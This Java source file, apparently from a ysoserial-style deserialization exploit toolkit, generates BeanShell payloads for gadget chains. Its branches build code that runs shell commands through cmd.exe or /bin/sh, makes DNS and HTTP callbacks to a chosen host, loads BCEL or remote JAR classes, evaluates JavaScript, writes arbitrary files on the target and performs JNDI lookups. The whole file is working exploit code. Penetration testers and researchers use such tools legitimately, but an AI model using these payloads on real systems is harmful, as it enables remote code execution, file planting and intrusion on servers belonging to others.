package me.gv7.woodpecker.yso.payloads.custom;

import me.gv7.woodpecker.yso.Strings;
import me.gv7.woodpecker.yso.payloads.util.BASE64Decoder;
import me.gv7.woodpecker.yso.payloads.util.CommonUtil;

import java.util.Arrays;

import static me.gv7.woodpecker.yso.payloads.custom.CustomCommand.*;

public class BeanShellUtil {
    public static String getPayload(String command) throws Exception {
        String payload = null;
        // 遗留：SLEEP,LOADJAE_WITH_ARGS,AUTH_CMD,
        if (command.startsWith(COMMAND_DNSLOG)) {
            String dnslogDomain = command.substring(COMMAND_DNSLOG.length());
            payload = String.format("compare(Object foo, Object bar) { new java.net.InetSocketAddress(\"%s\",80);return new Integer(1);}",dnslogDomain);
        } else if (command.startsWith(COMMAND_HTTPLOG)) {
            String strURL = command.substring(COMMAND_HTTPLOG.length());
            payload = String.format("compare(Object foo, Object bar) { new java.net.URL(\"%s\").getContent();return new Integer(1);}",strURL);
        } else if(command.toLowerCase().contains(COMMAND_RAW_CMD)) {
            String cmd = command.substring(COMMAND_RAW_CMD.length());
            payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{" +
                    Strings.join( // does not support spaces in quotes
                        Arrays.asList(cmd.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\\"").split(" ")),
                        ",", "\"", "\"") +
                    "}).start();return new Integer(1);}";
        } else if (command.toLowerCase().contains(COMMAND_WIN_CMD)){
            String cmd = command.substring(COMMAND_WIN_CMD.length());
            payload = String.format("compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"cmd.exe\",\"/c\",\"%s\"}).start();return new Integer(1);}",cmd);
        } else if (command.toLowerCase().contains(COMMAND_LINUX_CMD)) {
            String cmd = command.substring(COMMAND_LINUX_CMD.length());
            payload = String.format("compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"/bin/sh\",\"-c\",\"%s\"}).start();return new Integer(1);}",cmd);
        } else if (command.startsWith(COMMAND_BCEL)) {
            String strBCEL = command.substring(COMMAND_BCEL.length());
            payload = String.format("compare(Object foo, Object bar) { new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();return new Integer(1);}",strBCEL);
        } else if (command.toLowerCase().startsWith(COMMAND_SCRIPT_FILE)){
            String scriptFilePath = command.substring(COMMAND_SCRIPT_FILE.length());
            String scriptFileByteCode = CommonUtil.byteToByteArrayString(CommonUtil.readFileByte(scriptFilePath));
            payload = String.format("compare(Object foo, Object bar) {new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(new java.lang.String(new byte[]{%s}));return new Integer(1);}",scriptFileByteCode);
        } else if (command.toLowerCase().startsWith(COMMAND_SCRIPT_BASE64)){
            String scriptContent = command.substring(COMMAND_SCRIPT_BASE64.length());
            scriptContent = new String(new BASE64Decoder().decodeBuffer(scriptContent));
            payload = String.format("compare(Object foo, Object bar) {new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(new java.lang.String(new byte[]{%s}));return new Integer(1);}",CommonUtil.stringToByteArrayString(scriptContent));
        } else if (command.toLowerCase().startsWith(COMMAND_UPLOADFILE)){
            String tmp = command.substring(COMMAND_UPLOADFILE.length());
            String localFilePath = tmp.split("\\|")[0];
            String remoteFilePath = tmp.split("\\|")[1] ;
            String fileContentByte = CommonUtil.fileContextToByteArrayString(localFilePath);
            payload = String.format("compare(Object foo, Object bar) {new java.io.FileOutputStream(\"%s\").write(new byte[]{%s});return new Integer(1);}",remoteFilePath,fileContentByte);
        } else if (command.toLowerCase().startsWith(COMMAND_UPLOAD_BASE64)){
            String tmp = command.substring(COMMAND_UPLOAD_BASE64.length());
            String remoteFilePath = tmp.split("\\|")[0] ;
            String fileBase64Content = tmp.split("\\|")[1];
            byte[] fileContent = new BASE64Decoder().decodeBuffer(fileBase64Content);
            String fileByteCode = CommonUtil.byteToByteArrayString(fileContent);
            payload = String.format("compare(Object foo, Object bar) {new java.io.FileOutputStream(\"%s\").write(new byte[]{%s});return new Integer(1);}",remoteFilePath,fileByteCode);
        } else if (command.toLowerCase().contains(COMMAND_LOADJAR)){
            String cmdInfo = command.substring(COMMAND_LOADJAR.length());
            String jarpath = cmdInfo.split("\\|")[0];
            String className = cmdInfo.split("\\|")[1];
            payload = String.format("compare(Object foo, Object bar) {new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(\"%s\")}).loadClass(\"%s\").newInstance();return new Integer(1);}",jarpath,className);
        } else if(command.toLowerCase().contains(COMMAND_JNDI)){
            String jndiURL = command.substring(COMMAND_JNDI.length());
            payload = String.format("compare(Object foo, Object bar) { new javax.naming.InitialContext().lookup(\"%s\");return new Integer(1);}",jndiURL);
        } else {
            throw new Exception(String.format("Command [%s] not supported",command));
        }
        return payload;
    }
}
